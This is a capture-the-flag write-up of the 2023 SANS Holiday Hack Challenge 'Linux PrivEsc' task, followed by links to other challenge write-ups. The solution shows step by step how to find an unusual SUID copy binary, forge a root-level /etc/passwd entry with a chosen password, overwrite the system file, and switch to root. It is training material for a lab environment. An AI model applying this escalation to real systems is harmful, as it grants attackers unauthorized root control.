# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## Linux PrivEsc
Difficulty: :christmas_tree::christmas_tree::christmas_tree:    
Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

### Hints
#### Linux Privilege Escalation Techniques
*From: Rose Mold*  
There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system.
#### Linux Command Injection
*From: Rose Mold*  
Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

### Solution
Knowing that the challenge is related to Linux Privilege Escalation, a common reconnaissance step is to list SUID executables, which in this case highlights an uncommon one called simplecopy:
```bash
elf@72cacccd1fe6:~$ find / -type f -perm -04000 -ls 2>/dev/null
  1312417     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /usr/bin/chfn
  1312423     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /usr/bin/chsh
  1312541     56 -rwsr-xr-x   1 root     root        55528 May 30  2023 /usr/bin/mount
  1312546     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /usr/bin/newgrp
  1312620     68 -rwsr-xr-x   1 root     root        67816 May 30  2023 /usr/bin/su
  1312484     88 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /usr/bin/gpasswd
  1312645     40 -rwsr-xr-x   1 root     root        39144 May 30  2023 /usr/bin/umount
  1312557     68 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /usr/bin/passwd
  1457015     20 -rwsr-xr-x   1 root     root        16952 Dec  2 22:17 /usr/bin/simplecopy
```
The `simplecopy` executable looks like a standard `cp` command, but eventually allowing to overwrite root-owned files. One escalation path would be to overwrite `/etc/passwd`, adding a user with root privileges for which the attacker knows all credentials. First thing is to generate the passwd content:
```bash
thedead@dellian:~/hhc2023/Linux PrivEsc$ openssl passwd -1 -salt kringle con2023
$1$kringle$M.uL5k/EEbyamRF6aMNJz/
```
Then add the new user `breakstuff` it to the `/etc/passwd` file:
```bash
elf@72cacccd1fe6:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
# Output removed to shorten report
elf:x:1000:1000::/home/elf:/bin/sh
elf@72cacccd1fe6:~$ cp /etc/passwd passwd_tamper
elf@72cacccd1fe6:~$ echo 'breakstuff:$1$kringle$M.uL5k/EEbyamRF6aMNJz/:0:0:root:/root:/bin/bash' >> passwd_tamper
elf@72cacccd1fe6:~$ /usr/bin/simplecopy passwd_tamper /etc/passwd
```
Lastly login as `breakstuff` to gain root privileges and... `runmetoanswer`!
```bash
elf@72cacccd1fe6:~$ su breakstuff
Password:
root@72cacccd1fe6:/home/elf# cd
root@72cacccd1fe6:~# ls
runmetoanswer
root@b5bd66274d00:~# ./runmetoanswer
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

---
## [Faster Lock Combination](/08%20-%20Faster%20Lock%20Combination/README.md)
## [Game Cartridges: Vol 1](/09%20-%20Game%20Cartridges%3A%20Vol%201/README.md)
## [Game Cartridges: Vol 2](/10%20-%20Game%20Cartridges%3A%20Vol%202/README.md)
## [Game Cartridges: Vol 3](/11%20-%20Game%20Cartridges%3A%20Vol%203/README.md)
## [Na'an](/12%20-%20Na%27an/README.md)
## [KQL Kraken Hunt](/13%20-%20KQL%20Kraken%20Hunt/README.md)
## [Phish Detection Agency](/14%20-%20Phish%20Detection%20Agency/README.md)
## [Hashcat](/15%20-%20Hashcat/README.md)
## [Elf Hunt](/16%20-%20Elf%20Hunt/README.md)
## [Certificate SSHenanigans](/17%20-%20Certificate%20SSHenanigans/README.md)
## [The Captain's Comms](/18%20-%20The%20Captain%27s%20Comms/README.md)
## [Active Directory](/19%20-%20Active%20Directory/README.md)
## [Space Island Door Access Speaker](/20%20-%20Space%20Island%20Door%20Access%20Speaker/README.md)
## [Camera Access](/21%20-%20Camera%20Access/README.md)
## [Missile Diversion](/22%20-%20Missile%20Diversion/README.md)
## [BONUS! Fishing Guide](/23%20-%20BONUS%21%20Fishing%20Guide/README.md)
## [BONUS! Fishing Mastery](/24%20-%20BONUS%21%20Fishing%20Mastery/README.md)
## [Conclusions](/README.md#conclusions)
---
## [thedead@dellian:~$ whoami](/README.md#thedeaddellian-whoami)
## [Holiday Hack Orientation](/01%20-%20Holiday%20Hack%20Orientation/README.md)
## [Snowball Fight](/02%20-%20Snowball%20Fight/README.md)
## [Linux 101](/03%20-%20Linux%20101/README.md)
## [Reportinator](/04%20-%20Reportinator/README.md)
## [Azure 101](/05%20-%20Azure%20101/README.md)
## [Luggage Lock](/06%20-%20Luggage%20Lock/README.md)